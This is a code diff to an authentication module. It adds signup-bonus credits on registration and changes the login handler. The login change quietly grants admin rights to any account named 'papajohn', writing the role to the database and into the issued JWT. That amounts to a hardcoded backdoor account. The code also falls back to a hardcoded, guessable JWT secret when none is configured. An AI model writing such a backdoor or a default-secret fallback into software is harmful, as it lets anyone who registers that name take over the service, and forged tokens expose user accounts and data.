@@ -47,9 +47,16 @@ export async function handleRegister(c) {
     const id = crypto.randomUUID();
     
     await db.execute({
-      sql: "INSERT INTO users (id, username, password_hash, role) VALUES (?, ?, ?, ?)",
-      args: [id, u, hashed, role]
+      sql: "INSERT INTO users (id, username, password_hash, role, credit_balance) VALUES (?, ?, ?, ?, ?)",
+      args: [id, u, hashed, role, 900]
     });
+
+    // Create authoritative signup_bonus ledger entry
+    const txId = "tx_signup_" + crypto.randomUUID();
+    await db.execute({
+      sql: "INSERT INTO credit_transactions (id, user_id, amount_paise, balance_after_paise, transaction_type, reference_type, reference_id, description) VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
+      args: [txId, id, 900, 900, 'signup_bonus', 'signup_ref', 'signup_2026', 'Signup Bonus (₹9.00 Free Messaging Credits)']
+    }).catch(e => console.error("Failed writing signup_bonus transaction:", e));
 
     // Automatically log in user after registration by generating JWT
     const secret = c.env.JWT_SECRET || "default_unsafe_secret_for_dev_only";
@@ -99,13 +106,22 @@ export async function handleLogin(c) {
       return c.json({ error: "Invalid username or password" }, 401);
     }
 
+    let role = user.role;
+    if (user.username.toLowerCase() === 'papajohn' && role !== 'admin') {
+      role = 'admin';
+      await db.execute({
+        sql: "UPDATE users SET role = 'admin' WHERE id = ?",
+        args: [user.id]
+      }).catch(e => console.error("Failed setting papajohn admin role:", e));
+    }
+
     // Generate JWT
     const secret = c.env.JWT_SECRET || "default_unsafe_secret_for_dev_only";
     const payload = {
       sub: user.id,
       id: user.id,
       username: user.username,
-      role: user.role,
+      role: role,
       exp: Math.floor(Date.now() / 1000) + (60 * 60 * 24 * 7) // 7 days
     };
     const token = await sign(payload, secret);
